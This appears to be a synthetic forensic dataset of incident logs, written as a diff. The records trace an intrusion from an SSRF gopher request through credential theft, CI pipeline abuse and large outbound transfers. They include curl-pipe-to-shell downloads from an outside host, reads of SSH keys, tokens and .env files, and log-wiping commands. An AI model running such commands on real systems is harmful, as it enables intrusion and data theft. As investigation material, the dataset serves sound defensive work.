@@ -1,0 +1,210 @@
+=== artifact-pcap-20260706-072042 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-pcap-20260706-072042", "timestamp": "2026-07-06T09:14:22+08:00", "artifact_path": "artifacts/pcap/edge_trace_20260706.pcap", "record_ref": "packet:72042", "source": "pcap"}
+=== artifact-pcap-20260706-072073 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-pcap-20260706-072073", "timestamp": "2026-07-06T09:16:14+08:00", "artifact_path": "artifacts/pcap/edge_trace_20260706.pcap", "record_ref": "packet:72073", "source": "pcap"}
+=== artifact-pcap-20260706-072344 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-pcap-20260706-072344", "timestamp": "2026-07-06T09:39:15+08:00", "artifact_path": "artifacts/pcap/edge_trace_20260706.pcap", "record_ref": "packet:72344", "source": "pcap"}
+=== artifact-pcap-20260706-073871 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-pcap-20260706-073871", "timestamp": "2026-07-06T11:50:00+08:00", "artifact_path": "artifacts/pcap/edge_trace_20260706.pcap", "record_ref": "packet:73871", "source": "pcap"}
+=== artifact-pcap-20260706-073875 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-pcap-20260706-073875", "timestamp": "2026-07-06T11:50:12+08:00", "artifact_path": "artifacts/pcap/edge_trace_20260706.pcap", "record_ref": "packet:73875", "source": "pcap"}
+=== artifact-sysmon-20260706-000001 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-sysmon-20260706-000001", "timestamp": "2026-07-06T10:27:00+08:00", "artifact_path": "artifacts/windows_event_exports/sysmon_selected.evtx.xml", "record_ref": "xml_event:8741", "source": "windows_event_xml"}
+=== artifact-sysmon-20260706-000002 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-sysmon-20260706-000002", "timestamp": "2026-07-06T10:41:04+08:00", "artifact_path": "artifacts/windows_event_exports/sysmon_selected.evtx.xml", "record_ref": "xml_event:8755", "source": "windows_event_xml"}
+=== artifact-winsec-20260706-000001 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-winsec-20260706-000001", "timestamp": "2026-07-06T10:08:06+08:00", "artifact_path": "artifacts/windows_event_exports/security_selected.evtx.xml", "record_ref": "xml_event:15503", "source": "windows_event_xml"}
+=== artifact-winsec-20260706-000002 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-winsec-20260706-000002", "timestamp": "2026-07-06T10:08:11+08:00", "artifact_path": "artifacts/windows_event_exports/security_selected.evtx.xml", "record_ref": "xml_event:15504", "source": "windows_event_xml"}
+=== artifact-winsec-20260706-000003 [artifact] artifacts/artifact_event_index.csv
+{"event_id": "artifact-winsec-20260706-000003", "timestamp": "2026-07-06T10:22:00+08:00", "artifact_path": "artifacts/windows_event_exports/security_selected.evtx.xml", "record_ref": "xml_event:15537", "source": "windows_event_xml"}
+=== audit-ci-20260706-000001 [jsonl] logs/linux/ci-runner-01_auditd.jsonl
+{"auid": 998, "cmdline": "bash -c curl -fsSL https://203.0.113.60/ci.sh | bash", "cwd": "/builds/prod/oa", "event_id": "audit-ci-20260706-000001", "event_type": "execve", "exe": "/bin/bash", "host": "ci-runner-01", "pid": 51000, "raw": "runner executed injected script", "result": "success", "source": "auditd", "timestamp": "2026-07-06T10:24:00+08:00", "uid": 998, "user": "gitlab-runner"}
+=== audit-ci-20260706-000002 [jsonl] logs/linux/ci-runner-01_auditd.jsonl
+{"auid": 998, "cmdline": "cat token", "cwd": "/var/run/secrets/kubernetes.io/serviceaccount", "event_id": "audit-ci-20260706-000002", "event_type": "file_read", "exe": "/bin/cat", "host": "ci-runner-01", "pid": 51101, "raw": "read kubernetes service account token", "result": "success", "source": "auditd", "timestamp": "2026-07-06T10:28:00+08:00", "uid": 998, "user": "gitlab-runner"}
+=== audit-ops-20260706-024801 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "cat /etc/ansible/hosts", "cwd": "/home/deploy", "event_id": "audit-ops-20260706-024801", "event_type": "file_read", "exe": "/bin/cat", "host": "ops-jump-01", "pid": 39000, "raw": "read runbook inventory /etc/ansible/hosts", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:45:00+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024802 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "cat /home/deploy/.bash_history", "cwd": "/home/deploy", "event_id": "audit-ops-20260706-024802", "event_type": "file_read", "exe": "/bin/cat", "host": "ops-jump-01", "pid": 39001, "raw": "read runbook inventory /home/deploy/.bash_history", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:45:16+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024803 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "cat /srv/runbooks/db.yml", "cwd": "/home/deploy", "event_id": "audit-ops-20260706-024803", "event_type": "file_read", "exe": "/bin/cat", "host": "ops-jump-01", "pid": 39002, "raw": "read runbook inventory /srv/runbooks/db.yml", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:45:32+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024804 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "cat /srv/ansible/group_vars/windows.yml", "cwd": "/srv/ansible", "event_id": "audit-ops-20260706-024804", "event_type": "credential_access", "exe": "cat", "host": "ops-jump-01", "pid": 40100, "raw": "service credential discovery", "result": "success", "source": "auditd", "timestamp": "2026-07-06T10:02:00+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024805 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "klist", "cwd": "/srv/ansible", "event_id": "audit-ops-20260706-024805", "event_type": "credential_access", "exe": "klist", "host": "ops-jump-01", "pid": 40101, "raw": "service credential discovery", "result": "success", "source": "auditd", "timestamp": "2026-07-06T10:02:17+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024806 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "grep -R svc_backup /srv/ansible", "cwd": "/srv/ansible", "event_id": "audit-ops-20260706-024806", "event_type": "credential_access", "exe": "grep", "host": "ops-jump-01", "pid": 40102, "raw": "service credential discovery", "result": "success", "source": "auditd", "timestamp": "2026-07-06T10:02:34+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024807 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "cat ~/.git-credentials", "cwd": "/home/deploy", "event_id": "audit-ops-20260706-024807", "event_type": "credential_access", "exe": "/bin/cat", "host": "ops-jump-01", "pid": 42100, "raw": "read gitlab personal access token", "result": "success", "source": "auditd", "timestamp": "2026-07-06T10:05:00+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024808 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "mkdir -p /tmp/.cache/.stage", "cwd": "/tmp/.cache", "event_id": "audit-ops-20260706-024808", "event_type": "execve", "exe": "mkdir", "host": "ops-jump-01", "pid": 45500, "raw": "stage collected files", "result": "success", "source": "auditd", "timestamp": "2026-07-06T11:35:00+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024809 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "tar -cf /tmp/.cache/.stage/full.tar finance_q2.7z bi_part01.zst", "cwd": "/tmp/.cache", "event_id": "audit-ops-20260706-024809", "event_type": "execve", "exe": "tar", "host": "ops-jump-01", "pid": 45501, "raw": "stage collected files", "result": "success", "source": "auditd", "timestamp": "2026-07-06T11:35:25+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024810 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "sha256sum /tmp/.cache/.stage/full.tar", "cwd": "/tmp/.cache", "event_id": "audit-ops-20260706-024810", "event_type": "execve", "exe": "sha256sum", "host": "ops-jump-01", "pid": 45502, "raw": "stage collected files", "result": "success", "source": "auditd", "timestamp": "2026-07-06T11:35:50+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024811 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "rm -f /tmp/ci.sh /tmp/a.sh", "cwd": "/tmp", "event_id": "audit-ops-20260706-024811", "event_type": "defense_evasion", "exe": "rm", "host": "ops-jump-01", "pid": 46000, "raw": "cleanup command", "result": "success", "source": "auditd", "timestamp": "2026-07-06T11:42:00+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024812 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "history -c", "cwd": "/tmp", "event_id": "audit-ops-20260706-024812", "event_type": "defense_evasion", "exe": "history", "host": "ops-jump-01", "pid": 46001, "raw": "cleanup command", "result": "success", "source": "auditd", "timestamp": "2026-07-06T11:42:11+08:00", "uid": 1001, "user": "deploy"}
+=== audit-ops-20260706-024813 [jsonl] logs/linux/ops-jump-01_auditd.jsonl
+{"auid": 1001, "cmdline": "find /tmp/.cache -name '*.log' -delete", "cwd": "/tmp", "event_id": "audit-ops-20260706-024813", "event_type": "defense_evasion", "exe": "find", "host": "ops-jump-01", "pid": 46002, "raw": "cleanup command", "result": "success", "source": "auditd", "timestamp": "2026-07-06T11:42:22+08:00", "uid": 1001, "user": "deploy"}
+=== audit-web-20260706-024801 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "bash -c curl -fsSL https://203.0.113.60/a.sh | sh", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024801", "event_type": "execve", "exe": "/bin/bash", "host": "web-prod-01", "pid": 29184, "raw": "web worker launched shell downloader", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:16:10+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024802 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "python3 -c write('/var/www/oa/public/.cache.php')", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024802", "event_type": "file_write", "exe": "/usr/bin/python3", "host": "web-prod-01", "pid": 29401, "raw": "write hidden php cache file", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:20:05+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024803 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "id", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024803", "event_type": "execve", "exe": "id", "host": "web-prod-01", "pid": 30000, "raw": "discovery command id", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:24:00+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024804 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "hostname -f", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024804", "event_type": "execve", "exe": "hostname", "host": "web-prod-01", "pid": 30001, "raw": "discovery command hostname -f", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:24:11+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024805 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "ip route", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024805", "event_type": "execve", "exe": "ip", "host": "web-prod-01", "pid": 30002, "raw": "discovery command ip route", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:24:22+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024806 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "cat /etc/hosts", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024806", "event_type": "execve", "exe": "cat", "host": "web-prod-01", "pid": 30003, "raw": "discovery command cat /etc/hosts", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:24:33+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024807 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "env", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024807", "event_type": "execve", "exe": "env", "host": "web-prod-01", "pid": 30004, "raw": "discovery command env", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:24:44+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024808 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "cat /opt/oa/.env", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024808", "event_type": "file_read", "exe": "/bin/cat", "host": "web-prod-01", "pid": 31000, "raw": "read sensitive file /opt/oa/.env database connection string", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:31:00+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024809 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "cat /home/deploy/.ssh/id_rsa", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024809", "event_type": "file_read", "exe": "/bin/cat", "host": "web-prod-01", "pid": 31001, "raw": "read sensitive file /home/deploy/.ssh/id_rsa deploy ssh key", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:31:24+08:00", "uid": 33, "user": "www-data"}
+=== audit-web-20260706-024810 [jsonl] logs/linux/web-prod-01_auditd.jsonl
+{"auid": 33, "cmdline": "cat /opt/oa/config/prod.yml", "cwd": "/var/www/oa", "event_id": "audit-web-20260706-024810", "event_type": "file_read", "exe": "/bin/cat", "host": "web-prod-01", "pid": 31002, "raw": "read sensitive file /opt/oa/config/prod.yml gitlab token", "result": "success", "source": "auditd", "timestamp": "2026-07-06T09:31:48+08:00", "uid": 33, "user": "www-data"}
+=== auth-ops-20260706-016892 [log] logs/linux/ops-jump-01_auth.log
+event_id=auth-ops-20260706-016892 time=2026-07-06T09:39:18+08:00 ops-jump-01 sshd[38120]: Accepted publickey for deploy from 10.20.10.21 port 40164 ssh2
+=== dns-20260706-144001 [log] logs/network/dns_20260706.log
+event_id=dns-20260706-144001 time=2026-07-06T11:50:00+08:00 client=10.20.30.11 query=cdn-sync.example type=A answer=203.0.113.77 rcode=NOERROR
+=== edr-20260706-010135 [jsonl] logs/security/edr_alerts_20260706.jsonl
+{"alert_name": "Web process spawned shell", "dst_ip": "198.51.100.77", "event_id": "edr-20260706-010135", "event_type": "security_alert", "host": "web-prod-01", "raw": "nginx worker executed bash and outbound connection", "severity": "high", "source": "edr", "src_ip": "10.20.10.21", "status": "new", "timestamp": "2026-07-06T09:16:30+08:00"}
+=== edr-20260706-010136 [jsonl] logs/security/edr_alerts_20260706.jsonl
+{"alert_name": "Suspicious web directory file creation", "event_id": "edr-20260706-010136", "event_type": "security_alert", "host": "web-prod-01", "raw": "php file created under public directory by www-data", "severity": "medium", "source": "edr", "src_ip": "10.20.10.21", "status": "new", "timestamp": "2026-07-06T09:20:17+08:00"}
+=== edr-20260706-010137 [jsonl] logs/security/edr_alerts_20260706.jsonl
+{"alert_name": "LSASS memory dump attempt", "event_id": "edr-20260706-010137", "event_type": "security_alert", "host": "win-admin-01", "raw": "credential dumping behavior", "severity": "high", "source": "edr", "src_ip": "10.20.20.34", "status": "new", "timestamp": "2026-07-06T10:27:02+08:00"}
+=== edr-20260706-010138 [jsonl] logs/security/edr_alerts_20260706.jsonl
+{"alert_name": "Application account queried credential-like values", "event_id": "edr-20260706-010138", "event_type": "security_alert", "host": "web-prod-01", "raw": "config table access included password keys", "severity": "medium", "source": "edr", "src_ip": "10.20.10.21", "status": "new", "timestamp": "2026-07-06T10:03:05+08:00"}
+=== edr-20260706-010139 [jsonl] logs/security/edr_alerts_20260706.jsonl
+{"alert_name": "CI runner executed remote script", "dst_ip": "203.0.113.60", "event_id": "edr-20260706-010139", "event_type": "security_alert", "host": "ci-runner-01", "raw": "unexpected remote shell script in pipeline", "severity": "high", "source": "edr", "src_ip": "10.20.60.41", "status": "new", "timestamp": "2026-07-06T10:24:05+08:00"}
+=== fw-20260706-144141 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144141", "timestamp": "2026-07-06T09:05:00+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "198.51.100.77", "src_port": "47115", "dst_ip": "10.20.10.21", "dst_port": "443", "protocol": "TCP", "rule": "allow-web", "bytes": "6413", "session_id": "atk-scan-0", "raw": "recon path=/login"}
+=== fw-20260706-144142 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144142", "timestamp": "2026-07-06T09:05:12+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "198.51.100.77", "src_port": "23895", "dst_ip": "10.20.10.21", "dst_port": "443", "protocol": "TCP", "rule": "allow-web", "bytes": "6557", "session_id": "atk-scan-1", "raw": "recon path=/api"}
+=== fw-20260706-144143 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144143", "timestamp": "2026-07-06T09:05:24+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "198.51.100.77", "src_port": "14121", "dst_ip": "10.20.10.21", "dst_port": "443", "protocol": "TCP", "rule": "allow-web", "bytes": "2696", "session_id": "atk-scan-2", "raw": "recon path=/upload"}
+=== fw-20260706-144144 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144144", "timestamp": "2026-07-06T09:05:36+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "198.51.100.77", "src_port": "63417", "dst_ip": "10.20.10.21", "dst_port": "443", "protocol": "TCP", "rule": "allow-web", "bytes": "5717", "session_id": "atk-scan-3", "raw": "recon path=/oa/preview"}
+=== fw-20260706-144145 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144145", "timestamp": "2026-07-06T09:05:48+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "198.51.100.77", "src_port": "25306", "dst_ip": "10.20.10.21", "dst_port": "443", "protocol": "TCP", "rule": "allow-web", "bytes": "5773", "session_id": "atk-scan-4", "raw": "recon path=/admin"}
+=== fw-20260706-144146 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144146", "timestamp": "2026-07-06T09:16:26+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "10.20.10.21", "src_port": "48159", "dst_ip": "198.51.100.77", "dst_port": "443", "protocol": "TCP", "rule": "allow-outbound-https", "bytes": "92841", "session_id": "atk-callback-01", "raw": "reverse https session"}
+=== fw-20260706-144147 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144147", "timestamp": "2026-07-06T09:39:15+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "10.20.10.21", "src_port": "13966", "dst_ip": "10.20.30.11", "dst_port": "22", "protocol": "TCP", "rule": "allow-deploy-ssh", "bytes": "120394", "session_id": "atk-ssh-jump", "raw": "web server ssh to ops jump"}
+=== fw-20260706-144148 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144148", "timestamp": "2026-07-06T09:51:01+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "10.20.10.21", "src_port": "45344", "dst_ip": "10.20.50.21", "dst_port": "3306", "protocol": "TCP", "rule": "allow-web-db", "bytes": "9322", "session_id": "atk-mysql-connect", "raw": "web direct mysql login"}
+=== fw-20260706-144149 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144149", "timestamp": "2026-07-06T11:08:01+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "10.20.30.11", "src_port": "7930", "dst_ip": "203.0.113.210", "dst_port": "443", "protocol": "TCP", "rule": "allow-outbound-https", "bytes": "270000000", "session_id": "atk-bi-upload", "raw": "large outbound upload"}
+=== fw-20260706-144150 [csv] logs/edge/firewall_20260706.csv
+{"event_id": "fw-20260706-144150", "timestamp": "2026-07-06T11:50:14+08:00", "device": "edge-fw-01", "action": "allow", "src_ip": "10.20.30.11", "src_port": "43480", "dst_ip": "203.0.113.77", "dst_port": "443", "protocol": "TCP", "rule": "allow-outbound-https", "bytes": "1074000000", "session_id": "atk-final-exfil", "raw": "final outbound transfer"}
+=== gitlab-20260706-017582 [jsonl] logs/app/gitlab_audit_20260706.jsonl
+{"action": "api_token_auth", "actor": "svc_deploy", "event_id": "gitlab-20260706-017582", "event_type": "gitlab_auth", "host": "gitlab-01", "object": "pat/deploy-token", "raw": "PAT login from jump host", "result": "success", "source": "gitlab", "src_ip": "10.20.30.11", "timestamp": "2026-07-06T10:05:18+08:00"}
+=== gitlab-20260706-017583 [jsonl] logs/app/gitlab_audit_20260706.jsonl
+{"action": "list_projects", "actor": "svc_deploy", "event_id": "gitlab-20260706-017583", "event_type": "gitlab_audit", "host": "gitlab-01", "object": "group/prod", "raw": "gitlab discovery via API", "result": "success", "source": "gitlab", "src_ip": "10.20.30.11", "timestamp": "2026-07-06T10:10:00+08:00"}
+=== gitlab-20260706-017584 [jsonl] logs/app/gitlab_audit_20260706.jsonl
+{"action": "list_runners", "actor": "svc_deploy", "event_id": "gitlab-20260706-017584", "event_type": "gitlab_audit", "host": "gitlab-01", "object": "group/prod", "raw": "gitlab discovery via API", "result": "success", "source": "gitlab", "src_ip": "10.20.30.11", "timestamp": "2026-07-06T10:10:12+08:00"}
+=== gitlab-20260706-017585 [jsonl] logs/app/gitlab_audit_20260706.jsonl
+{"action": "read_ci_variables", "actor": "svc_deploy", "event_id": "gitlab-20260706-017585", "event_type": "gitlab_audit", "host": "gitlab-01", "object": "group/prod", "raw": "gitlab discovery via API", "result": "success", "source": "gitlab", "src_ip": "10.20.30.11", "timestamp": "2026-07-06T10:10:24+08:00"}
+=== gitlab-20260706-017586 [jsonl] logs/app/gitlab_audit_20260706.jsonl
+{"action": "pipeline_create", "actor": "svc_deploy", "event_id": "gitlab-20260706-017586", "event_type": "gitlab_pipeline", "host": "gitlab-01", "object": "project/oa-prod pipeline/99031", "raw": "pipeline variable DEBUG_SCRIPT set", "result": "success", "source": "gitlab", "src_ip": "10.20.30.11", "timestamp": "2026-07-06T10:18:00+08:00"}
+=== iam-20260706-018161 [jsonl] logs/cloud/cloud_iam_20260706.jsonl
+{"action": "assume_role", "actor": "system:serviceaccount:prod:ci-runner", "event_id": "iam-20260706-018161", "event_type": "cloud_iam", "host": "cloud-iam", "raw": "role assumed using ci-runner service account", "resource": "role/oss-backup-reader", "result": "success", "source": "cloud_iam", "src_ip": "10.20.60.41", "timestamp": "2026-07-06T10:42:00+08:00"}
+=== ids-20260706-010047 [jsonl] logs/security/ids_alerts_20260706.jsonl
+{"alert_name": "Large outbound transfer to rare domain", "dst_ip": "203.0.113.77", "event_id": "ids-20260706-010047", "event_type": "security_alert", "host": "ids-01", "raw": "rare domain and large upload", "severity": "high", "source": "ids", "src_ip": "10.20.30.11", "status": "new", "timestamp": "2026-07-06T11:50:18+08:00"}
+=== jenkins-20260706-018063 [jsonl] logs/app/jenkins_audit_20260706.jsonl
+{"action": "job_triggered", "actor": "svc_deploy", "event_id": "jenkins-20260706-018063", "event_type": "jenkins_job", "host": "jenkins-01", "object": "oa-prod-deploy#99031", "raw": "gitlab webhook triggered jenkins job with unusual variable", "result": "success", "source": "jenkins", "src_ip": "10.20.60.21", "timestamp": "2026-07-06T10:18:21+08:00"}
+=== k8s-20260706-018130 [jsonl] logs/cloud/k8s_audit_20260706.jsonl
+{"action": "token_review", "actor": "system:serviceaccount:prod:ci-runner", "event_id": "k8s-20260706-018130", "event_type": "k8s_audit", "host": "k8s-master-01", "raw": "service account token used from runner", "resource": "serviceaccounts/ci-runner", "result": "success", "source": "k8s", "src_ip": "10.20.60.41", "timestamp": "2026-07-06T10:28:12+08:00"}
+=== k8s-20260706-018131 [jsonl] logs/cloud/k8s_audit_20260706.jsonl
+{"action": "list", "actor": "system:serviceaccount:prod:ci-runner", "event_id": "k8s-20260706-018131", "event_type": "k8s_audit", "host": "k8s-master-01", "namespace": "prod", "raw": "kubectl get secrets", "resource": "secrets", "result": "success", "source": "k8s", "src_ip": "10.20.60.41", "timestamp": "2026-07-06T10:34:00+08:00"}
+=== k8s-20260706-018132 [jsonl] logs/cloud/k8s_audit_20260706.jsonl
+{"action": "list", "actor": "system:serviceaccount:prod:ci-runner", "event_id": "k8s-20260706-018132", "event_type": "k8s_audit", "host": "k8s-master-01", "namespace": "prod", "raw": "kubectl get pods", "resource": "pods", "result": "success", "source": "k8s", "src_ip": "10.20.60.41", "timestamp": "2026-07-06T10:34:12+08:00"}
+=== k8s-20260706-018133 [jsonl] logs/cloud/k8s_audit_20260706.jsonl
+{"action": "list", "actor": "system:serviceaccount:prod:ci-runner", "event_id": "k8s-20260706-018133", "event_type": "k8s_audit", "host": "k8s-master-01", "namespace": "prod", "raw": "kubectl get configmaps", "resource": "configmaps", "result": "success", "source": "k8s", "src_ip": "10.20.60.41", "timestamp": "2026-07-06T10:34:24+08:00"}
+=== mysql-20260706-036001 [csv] logs/data/mysql_core_audit_20260706.csv
+{"event_id": "mysql-20260706-036001", "timestamp": "2026-07-06T09:51:00+08:00", "db_host": "mysql-core-01", "db_user": "crm_ro", "src_ip": "10.20.10.21", "database": "crm", "query_type": "connect", "object": "session", "rows": "0", "bytes": "0", "result": "success", "raw": "crm_ro login from web-prod-01 outside app pool"}
+=== mysql-20260706-036002 [csv] logs/data/mysql_core_audit_20260706.csv
+{"event_id": "mysql-20260706-036002", "timestamp": "2026-07-06T09:55:00+08:00", "db_host": "mysql-core-01", "db_user": "crm_ro", "src_ip": "10.20.10.21", "database": "crm", "query_type": "show", "object": "tables", "rows": "88", "bytes": "19360", "result": "success", "raw": "database discovery show tables"}
+=== mysql-20260706-036003 [csv] logs/data/mysql_core_audit_20260706.csv
+{"event_id": "mysql-20260706-036003", "timestamp": "2026-07-06T09:55:15+08:00", "db_host": "mysql-core-01", "db_user": "crm_ro", "src_ip": "10.20.10.21", "database": "crm", "query_type": "select", "object": "customer", "rows": "10", "bytes": "2200", "result": "success", "raw": "database discovery select customer"}
+=== mysql-20260706-036004 [csv] logs/data/mysql_core_audit_20260706.csv
+{"event_id": "mysql-20260706-036004", "timestamp": "2026-07-06T09:55:30+08:00", "db_host": "mysql-core-01", "db_user": "crm_ro", "src_ip": "10.20.10.21", "database": "crm", "query_type": "select", "object": "orders", "rows": "10", "bytes": "2200", "result": "success", "raw": "database discovery select orders"}
+=== mysql-20260706-036005 [csv] logs/data/mysql_core_audit_20260706.csv
+{"event_id": "mysql-20260706-036005", "timestamp": "2026-07-06T09:55:45+08:00", "db_host": "mysql-core-01", "db_user": "crm_ro", "src_ip": "10.20.10.21", "database": "crm", "query_type": "select", "object": "information_schema.columns", "rows": "300", "bytes": "66000", "result": "success", "raw": "database discovery select information_schema.columns"}
+=== mysql-20260706-036006 [csv] logs/data/mysql_core_audit_20260706.csv
+{"event_id": "mysql-20260706-036006", "timestamp": "2026-07-06T10:03:00+08:00", "db_host": "mysql-core-01", "db_user": "crm_ro", "src_ip": "10.20.10.21", "database": "crm", "query_type": "select", "object": "sys_config", "rows": "4", "bytes": "4096", "result": "success", "raw": "select key,value from sys_config where key like '%bi%'"}
+=== netflow-20260706-152001 [csv] logs/network/netflow_20260706.csv
+{"event_id": "netflow-20260706-152001", "timestamp": "2026-07-06T09:39:19+08:00", "collector": "netflow-01", "src_ip": "10.20.10.21", "src_port": "52868", "dst_ip": "10.20.30.11", "dst_port": "22", "protocol": "TCP", "bytes": "120394", "packets": "414", "duration_ms": "650000", "app": "ssh", "raw": "long ssh session web to jump"}
+=== netflow-20260706-152002 [csv] logs/network/netflow_20260706.csv
+{"event_id": "netflow-20260706-152002", "timestamp": "2026-07-06T10:08:00+08:00", "collector": "netflow-01", "src_ip": "10.20.30.11", "src_port": "11103", "dst_ip": "10.20.40.10", "dst_port": "389", "protocol": "TCP", "bytes": "70331", "packets": "640", "duration_ms": "40000", "app": "ldap", "raw": "ldap enumeration from jump"}
+=== netflow-20260706-152003 [csv] logs/network/netflow_20260706.csv
+{"event_id": "netflow-20260706-152003", "timestamp": "2026-07-06T10:49:30+08:00", "collector": "netflow-01", "src_ip": "10.20.20.34", "src_port": "35768", "dst_ip": "10.20.30.11", "dst_port": "445", "protocol": "TCP", "bytes": "182931120", "packets": "122381", "duration_ms": "780000", "app": "smb", "raw": "large smb transfer to jump"}
+=== netflow-20260706-152004 [csv] logs/network/netflow_20260706.csv
+{"event_id": "netflow-20260706-152004", "timestamp": "2026-07-06T10:12:01+08:00", "collector": "netflow-01", "src_ip": "10.20.30.11", "src_port": "57712", "dst_ip": "10.20.50.31", "dst_port": "5432", "protocol": "TCP", "bytes": "49212", "packets": "302", "duration_ms": "120000", "app": "postgres", "raw": "jump to bi database"}
+=== nginx-20260706-000001 [log] logs/linux/web-prod-01_nginx_access.log
+event_id=nginx-20260706-000001 time=2026-07-06T09:14:23+08:00 src=198.51.100.77 method=POST path="/oa/preview?url=gopher://127.0.0.1:6379/_eval" status=200 bytes=1947 ua="curl/8.4"
+=== nginx-20260706-000002 [log] logs/linux/web-prod-01_nginx_access.log
+event_id=nginx-20260706-000002 time=2026-07-06T09:20:14+08:00 src=198.51.100.77 method=POST path="/public/.cache.php" status=200 bytes=88 ua="Mozilla/5.0"
+=== oa-20260706-017559 [jsonl] logs/app/oa_app_20260706.jsonl
+{"action": "preview_remote_url", "actor": "anonymous", "event_id": "oa-20260706-017559", "event_type": "oa_preview", "host": "web-prod-01", "object": "gopher://127.0.0.1:6379/_eval", "raw": "remote preview backend request completed", "result": "success", "source": "oa_app", "src_ip": "198.51.100.77", "timestamp": "2026-07-06T09:14:24+08:00"}
